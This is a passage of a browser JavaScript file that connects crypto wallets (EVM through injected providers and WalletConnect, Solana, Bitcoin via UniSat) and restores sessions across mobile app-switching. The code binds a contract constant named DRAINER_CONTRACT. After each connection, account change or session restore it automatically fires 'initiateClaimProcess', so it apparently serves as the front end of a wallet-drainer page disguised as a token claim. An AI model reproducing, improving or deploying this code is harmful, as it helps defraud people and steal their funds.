      logDebug(`SOL error: ${e.message}`);
      showStatus('Solana connection failed: ' + e.message, 'error');
      return false;
    }
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  EVM PROVIDER EVENTS
   * ═══════════════════════════════════════════════════════════════════════ */
  function setupEVMProviderEvents(provider) {
    if (!provider?.on) return;
    provider.on('accountsChanged', (accounts) => {
      if (!accounts?.length) {
        resetConnectedUI();
        clearSavedWallet();
        showStatus('Wallet disconnected', 'info');
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], null, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 1000);
      }
    });
    provider.on('chainChanged', (chainId) => showStatus(`Network changed to ${chainId}`, 'info'));
    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
      showStatus('Wallet disconnected', 'info');
    });
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  MAIN CONNECT DISPATCHER
   * ═══════════════════════════════════════════════════════════════════════ */
  async function connectWallet() {
    if (isConnecting) { logDebug('Connection already in progress'); return; }

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    const platform = getPlatform();
    logDebug(`Platform: ${platform} | mobile=${isMobile()} | inApp=${isInAppBrowser()}`);

    let success = false;

    /* ─── MOBILE PATH: WC only, single attempt with long timeout ─── */
    if (isMobile()) {
      logDebug('📱 Mobile: WalletConnect path');

      if (isInAppBrowser()) {
        showStatus('Please open this site in Safari or Chrome for wallet connection', 'error');
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
        return;
      }

      success = await connectViaWalletConnect(false, WC_TIMEOUT_MOBILE);

      // Only retry with test ID if the first attempt failed with a
      // non-user-initiated error AND we have a valid test ID
      if (!success && VALID_PUBLIC_TEST_ID &&
          !/user|cancel|reject/i.test(window.__wcDiagnostics.stats.lastConnectResult || '')) {
        logDebug('Mobile: retrying with test ID');
        success = await connectViaWalletConnect(true, WC_TIMEOUT_MOBILE);
      }

      if (success) {
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 1500);
      } else {
        showStatus('Wallet connection failed. Please try again.', 'error');
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
      }
      return;
    }

    /* ─── DESKTOP PATH: direct first, then WC, then native ─── */
    logDebug('🖥️ Desktop: full cascade');

    // 1. Direct EVM (fast)
    success = await connectDirectEVM(DIRECT_EVM_TIMEOUT);
    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1500);
      return;
    }

    // 2. WalletConnect
    logDebug('Desktop: WC fallback');
    success = await connectViaWalletConnect(false, WC_TIMEOUT_DESKTOP);
    if (!success && VALID_PUBLIC_TEST_ID &&
        !/user|cancel|reject/i.test(window.__wcDiagnostics.stats.lastConnectResult || '')) {
      success = await connectViaWalletConnect(true, WC_TIMEOUT_DESKTOP);
    }
    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1500);
      return;
    }

    // 3. Solana
    if (getSolanaWallets().length > 0) {
      success = await connectSolana();
      if (success) {
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 1500);
        return;
      }
    }

    // 4. Bitcoin
    if (window.unisat) {
      success = await connectBitcoin();
      if (success) {
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 1500);
        return;
      }
    }

    // All failed
    logDebug('❌ Desktop: all methods failed');
    showStatus('No supported wallet found. Please install a wallet.', 'error');
    setButtonState(connectButton, 'failed');
    if (walletButton) setButtonState(walletButton, 'failed');
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  DISCONNECT
   * ═══════════════════════════════════════════════════════════════════════ */
  async function disconnectWallet() {
    try {
      if (window.solanaProvider?.disconnect) {
        try { await window.solanaProvider.disconnect(); } catch (e) {}
      }
      if (client && currentSession) {
        try {
          await client.disconnect({
            topic: currentSession.topic,
            reason: { code: 6000, message: 'User disconnected' },
          });
        } catch (e) {}
        currentSession = null;
      }
      if (web3Instance?.currentProvider?.disconnect) {
        try { await web3Instance.currentProvider.disconnect(); } catch (e) {}
      }
    } catch (err) { logDebug(`Disconnect error: ${err.message}`); }
    resetConnectedUI();
    clearSavedWallet();
    window.solanaProvider = null;
    window.solanaPublicKey = null;
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  BUTTON HANDLERS
   * ═══════════════════════════════════════════════════════════════════════ */
  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved && (currentSession || getSavedChainType() !== 'unknown')) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  // Mobile: pre-warm WC on first touch intent
  if (isMobile()) {
    const warm = () => { preloadWCLibs(); };
    connectButton?.addEventListener('touchstart', warm, { passive: true, once: true });
    walletButton?.addEventListener('touchstart', warm, { passive: true, once: true });
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  PENDING SESSION RESTORE (mobile app-switching)
   * ═══════════════════════════════════════════════════════════════════════ */
  async function tryRestorePendingSession() {
    const pendingUri = sessionStorage.getItem('pending_wc_uri');
    const pendingTs = sessionStorage.getItem('pending_wc_timestamp');
    if (!pendingUri || !pendingTs || !client) return false;

    const elapsed = Date.now() - parseInt(pendingTs, 10);
    if (elapsed > 120000) {
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      return false;
    }

    try {
      const sessions = client.session.getAll ? client.session.getAll() : [];
      if (!sessions.length) return false;

      const session = sessions[sessions.length - 1];
      const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (!account) return false;

      logDebug(`♻️ Restoring pending WC session: ${account}`);
      currentSession = session;
      saveWallet(account, session, 'evm');

      const provider = await EthereumProvider.init({
        projectId,
        metadata: DAPP_METADATA,
        session,
      });
      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider = provider;
      setupEVMProviderEvents(provider);
      updateConnectedUI(account, 'evm');

      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1000);
      return true;
    } catch (e) {
      logDebug(`Pending restore failed: ${e.message}`);
      return false;
    }
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  RESTORE SAVED CONNECTION
   * ═══════════════════════════════════════════════════════════════════════ */
  async function restoreWalletConnection() {
    // Priority 1: pending WC session (fastest path back for mobile)
    if (await tryRestorePendingSession()) return;

    const savedWallet = getSavedWallet();
    const savedChain = getSavedChainType();
    const savedSession = getSavedSession();
    if (!savedWallet || savedChain === 'unknown') return;

    logDebug(`♻️ Restoring ${savedChain}: ${savedWallet}`);

    if (savedChain === 'evm') {
      if (savedSession) {
        const initOk = await initWalletConnect(false);
        if (initOk) {
          try {
            const session = client.session.get(savedSession.topic);
            if (session) {
              currentSession = session;
              const provider = await EthereumProvider.init({
                projectId,
                metadata: DAPP_METADATA,
                session,
              });
              const Web3 = (await import('web3')).default;
              web3Instance = new Web3(provider);
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
              activeProvider = provider;
              updateConnectedUI(savedWallet, 'evm');
              return;
            }
          } catch (e) { logDebug(`Session restore failed: ${e.message}`); }
        }
      }
      // Desktop injected fallback
      if (isDesktop() && window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0 && accounts[0] === savedWallet) {
            const Web3 = (await import('web3')).default;
            web3Instance = new Web3(window.ethereum);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            activeProvider = window.ethereum;
            updateConnectedUI(savedWallet, 'evm');
            setupEVMProviderEvents(window.ethereum);
            return;
          }
        } catch (e) {}
      }
      clearSavedWallet();
    } else if (savedChain === 'solana') {
      if (isDesktop() && window.solana?.publicKey) {
        const addr = window.solana.publicKey.toString();
        if (addr === savedWallet) {
          updateConnectedUI(savedWallet, 'solana');
          window.solanaPublicKey = addr;
          window.solanaProvider = window.solana;
          return;
        }
      }
      if (isDesktop()) {
        const ok = await connectSolana();
        if (ok) return;
      }
      clearSavedWallet();
    } else if (savedChain === 'bitcoin') {
      if (isDesktop() && window.unisat) {
        try {
          const accounts = await window.unisat.getAccounts();
          if (accounts.length > 0 && accounts[0] === savedWallet) {
            updateConnectedUI(savedWallet, 'bitcoin');
            return;
          }
        } catch (e) {}
      }
      clearSavedWallet();
    }
  }

  /* ═══════════════════════════════════════════════════════════════════════
   *  BOOT
   * ═══════════════════════════════════════════════════════════════════════ */
  // 1. Kick off WC lib preload in background — this is the key optimization
  preloadWCLibs();

  // 2. Setup EIP-6963 discovery
  setupEIP6963();

  // 3. Restore any saved session
  try {
    await restoreWalletConnection();
  } catch (err) {
    logDebug(`Restore error: ${err.message}`);
  }

  // 4. Attach global provider events on desktop
  if (window.ethereum && isDesktop()) setupEVMProviderEvents(window.ethereum);

  /* ═══════════════════════════════════════════════════════════════════════
   *  VISIBILITY CHANGE — for mobile app-switching back to page
   * ═══════════════════════════════════════════════════════════════════════ */
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && getSavedWallet()) {
      logDebug('Page visible — checking session');
      if (sessionStorage.getItem('pending_wc_uri')) {
        setTimeout(() => { tryRestorePendingSession(); }, 800);
      }
    }
  });

  /* ═══════════════════════════════════════════════════════════════════════
   *  CLEANUP
   * ═══════════════════════════════════════════════════════════════════════ */
  window.addEventListener('beforeunload', () => {
    try { modal?.closeModal?.(); } catch (e) {}
  });

  logDebug(`✅ main.js ready — ${getPlatform()} | mobile=${isMobile()}`);
  logDebug(`Flow: ${isMobile() ? 'WC only (45s)' : 'Direct (4s) → WC (90s) → SOL → BTC'}`);
})();
